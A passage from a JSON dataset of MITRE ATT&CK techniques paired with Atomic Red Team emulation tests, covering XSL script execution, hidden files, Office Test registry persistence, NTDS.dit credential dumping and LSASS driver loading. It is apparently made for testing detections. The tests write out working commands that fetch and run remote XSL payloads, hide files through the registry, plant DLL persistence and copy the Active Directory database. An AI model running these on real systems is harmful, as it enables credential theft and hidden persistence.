["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>", "atomic_tests": [{"name": "MSXSL Bypass using local files", "auto_generated_guid": "ca23bfb2-023f-49c5-8802-e66997de462d", "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"xmlfile": {"description": "Location of the test XML file on the local filesystem.", "type": "path", "default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml"}, "xslfile": {"description": "Location of the test XSL script file on the local filesystem.", "type": "path", "default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl"}, "msxsl_exe": {"description": "Location of the MSXSL executable.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "XML file must exist on disk at specified location (#{xmlfile})\n", "prereq_command": "if (Test-Path \"#{xmlfile}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{xmlfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"}, {"description": "XSL file must exist on disk at specified location (#{xslfile})\n", "prereq_command": "if (Test-Path \"#{xslfile}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{xslfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"}, {"description": "msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n", "prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"}], "executor": {"command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n", "cleanup_command": "del \"#{msxsl_exe}\" >nul 2>&1\n", "name": "command_prompt"}}, {"name": "MSXSL Bypass using remote files", "auto_generated_guid": "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985", "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"xmlfile": {"description": "Remote location (URL) of the test XML file.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"}, "xslfile": {"description": "Remote location (URL) of the test XSL script file.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"}, "msxsl_exe": {"description": "Location of the MSXSL executable.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n", "prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"}], "executor": {"command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n", "cleanup_command": "del -Path #{msxsl_exe} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "WMIC bypass using local XSL file", "auto_generated_guid": "1b237334-3e21-4a0c-8178-b8c996124988", "description": "Executes the code specified within a XSL script using a local payload.\n", "supported_platforms": ["windows"], "input_arguments": {"wmic_command": {"description": "WMI command to execute using wmic.exe", "type": "string", "default": "process list"}, "local_xsl_file": {"description": "Location of the test XSL script file on the local filesystem.", "type": "path", "default": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n", "prereq_command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{local_xsl_file}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n"}], "executor": {"command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n", "name": "command_prompt"}}, {"name": "WMIC bypass using remote XSL file", "auto_generated_guid": "7f5be499-33be-4129-a560-66021f379b9b", "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_xsl_file": {"description": "Remote location of an XSL payload.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"}, "wmic_command": {"description": "WMI command to execute using wmic.exe", "type": "string", "default": "process list"}}, "executor": {"command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n", "name": "command_prompt"}}]}, "T1564.001": {"name": "Hidden Files and Directories", "technique_id": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d", "external_id": "T1564.001", "data_components": ["Command Execution", "File Metadata", "Process Creation", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.", "atomic_tests": [{"name": "Create a hidden file in a hidden directory", "auto_generated_guid": "61a782e5-9a19-40b5-8ba4-69a4b9f3d7be", "description": "Creates a hidden file inside a hidden directory\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n", "cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n", "name": "sh"}}, {"name": "Mac Hidden file", "auto_generated_guid": "cddb9098-3b47-4e01-9d3b-6f5f323288a9", "description": "Hide a file on MacOS\n", "supported_platforms": ["macos"], "executor": {"command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "name": "sh"}}, {"name": "Create Windows System File with Attrib", "auto_generated_guid": "f70974c8-c094-4574-b542-2c545af95a32", "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify using Attrib command", "type": "string", "default": "%temp%\\T1564.001.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"}], "executor": {"command": "attrib.exe +s #{file_to_modify}\n", "cleanup_command": "del /A:S #{file_to_modify} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Windows Hidden File with Attrib", "auto_generated_guid": "dadb792e-4358-4d8d-9207-b771faa0daa5", "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify using Attrib command", "type": "string", "default": "%temp%\\T1564.001.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"}], "executor": {"command": "attrib.exe +h #{file_to_modify}\n", "cleanup_command": "del /A:H #{file_to_modify} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Hidden files", "auto_generated_guid": "3b7015f2-3144-4205-b799-b05580621379", "description": "Requires Apple Dev Tools\n", "supported_platforms": ["macos"], "input_arguments": {"filename": {"description": "path of file to hide", "type": "path", "default": "/tmp/evil"}}, "executor": {"command": "setfile -a V #{filename}\n", "name": "sh"}}, {"name": "Hide a Directory", "auto_generated_guid": "b115ecaf-3b24-4ed2-aefe-2fcb9db913d3", "description": "Hide a directory on MacOS\n", "supported_platforms": ["macos"], "executor": {"command": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n", "cleanup_command": "rm /var/tmp/T1564.001_mac.txt\n", "name": "sh"}}, {"name": "Show all hidden files", "auto_generated_guid": "9a1ec7da-b892-449f-ad68-67066d04380c", "description": "Show all hidden files on MacOS\n", "supported_platforms": ["macos"], "executor": {"command": "defaults write com.apple.finder AppleShowAllFiles YES\n", "cleanup_command": "defaults write com.apple.finder AppleShowAllFiles NO\n", "name": "sh"}}, {"name": "Hide Files Through Registry", "auto_generated_guid": "f650456b-bd49-4bc1-ae9d-271b5b9581e7", "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Windows Hidden File with powershell", "auto_generated_guid": "7f66d539-4fbe-4cfa-9a56-4a2bf660c58a", "description": "Creates a file and marks it as hidden through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"H\" Hidden.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify", "type": "string", "default": "%temp%\\T1564.001-9.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1564.001-9 >> #{file_to_modify}\n"}], "executor": {"command": "$file = Get-Item $env:temp\\T1564.001-9.txt -Force\n$file.attributes='Hidden'\n", "cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n", "name": "powershell", "elevation_required": true}}, {"name": "Create Windows System File with powershell", "auto_generated_guid": "d380c318-0b34-45cb-9dad-828c11891e43", "description": "Creates a file and marks it as System through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"S\" System.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify", "type": "string", "default": "%temp%\\T1564.001-10.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1564.001-10 >> #{file_to_modify}\n"}], "executor": {"command": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n", "cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n", "name": "powershell", "elevation_required": true}}]}, "T1137.002": {"name": "Office Test", "technique_id": "attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a", "external_id": "T1137.002", "data_components": ["Windows Registry Key Creation", "File Creation", "Command Execution", "Module Load", "Process Creation", "File Modification", "Windows Registry Key Modification"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.", "atomic_tests": [{"name": "Office Application Startup Test Persistence (HKCU)", "auto_generated_guid": "c3e35b58-fe1c-480b-b540-7600fb612563", "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}, {"description": "DLL files must exist on disk at specified location", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\""}], "executor": {"name": "powershell", "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n", "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore"}}]}, "T1003.003": {"name": "NTDS", "technique_id": "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24", "external_id": "T1003.003", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n", "atomic_tests": [{"name": "Create Volume Shadow Copy with vssadmin", "auto_generated_guid": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon)", "type": "string", "default": "C:"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}], "executor": {"command": "vssadmin.exe create shadow /for=#{drive_letter}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Copy NTDS.dit from Volume Shadow Copy", "auto_generated_guid": "c6237146-9ea6-4711-85c9-c56d263a6b03", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n", "supported_platforms": ["windows"], "input_arguments": {"vsc_name": {"description": "Name of Volume Shadow Copy", "type": "string", "default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"}, "extract_path": {"description": "Path for extracted NTDS.dit", "type": "path", "default": "C:\\Windows\\Temp"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}, {"description": "Volume shadow copy must exist\n", "prereq_command": "if not exist #{vsc_name} (exit /b 1)\n", "get_prereq_command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n"}, {"description": "Extract path must exist\n", "prereq_command": "if not exist #{extract_path} (exit /b 1)\n", "get_prereq_command": "mkdir #{extract_path}\n"}], "executor": {"command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Dump Active Directory Database with NTDSUtil", "auto_generated_guid": "2364e33d-ceab-4641-8468-bfb1d7cc2723", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n", "supported_platforms": ["windows"], "input_arguments": {"output_folder": {"description": "Path where resulting dump should be placed", "type": "path", "default": "C:\\Windows\\Temp\\ntds_T1003"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}], "executor": {"command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n", "cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Volume Shadow Copy with WMI", "auto_generated_guid": "224f7de0-8f0a-4a94-b5d8-989b036c86da", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon and backslash)", "type": "string", "default": "C:\\"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}], "executor": {"command": "wmic shadowcopy call create Volume=#{drive_letter}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Volume Shadow Copy remotely with WMI", "auto_generated_guid": "d893459f-71f0-484d-9808-ec83b2b64226", "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon and backslash)", "type": "string", "default": "C:\\"}, "target_host": {"description": "IP Address / Hostname you want to target", "type": "string", "default": "localhost"}}, "dependencies": [{"description": "Target must be a reachable Domain Controller, and current context must be domain admin\n", "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n", "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"}], "executor": {"command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Volume Shadow Copy remotely (WMI) with esentutl", "auto_generated_guid": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865", "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n", "supported_platforms": ["windows"], "input_arguments": {"source_path": {"description": "File to shadow copy", "type": "string", "default": "c:\\windows\\ntds\\ntds.dit"}, "target_path": {"description": "Target path of the result file", "type": "string", "default": "c:\\ntds.dit"}, "target_host": {"description": "IP Address / Hostname you want to target", "type": "string", "default": "localhost"}}, "dependencies": [{"description": "Target must be a reachable Domain Controller, and current context must be domain admin\n", "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n", "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"}], "executor": {"command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Volume Shadow Copy with Powershell", "auto_generated_guid": "542bb97e-da53-436b-8e43-e0a7d31a6c24", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon)", "type": "string", "default": "C:\\"}}, "executor": {"command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n", "name": "powershell", "elevation_required": true}}, {"name": "Create Symlink to Volume Shadow Copy", "auto_generated_guid": "21748c28-2793-4284-9e07-d6d028b66702", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon)", "type": "string", "default": "C:"}, "symlink_path": {"description": "symlink path", "type": "string", "default": "C:\\Temp\\vssstore"}}, "executor": {"command": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1547.008": {"name": "LSASS Driver", "technique_id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4", "external_id": "T1547.008", "data_components": ["File Creation", "File Modification", "Driver Load", "Module Load"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--49c06d54-9002-491d-9147-8efb537fbd26", "course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1", "course-of-action--e8242a33-481c-4891-af63-4cf3e4cf6aff"], "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.", "atomic_tests": [{"name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt", "auto_generated_guid": "8ecef16d-d289-46b4-917b-0dba6dc81cf1", "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified 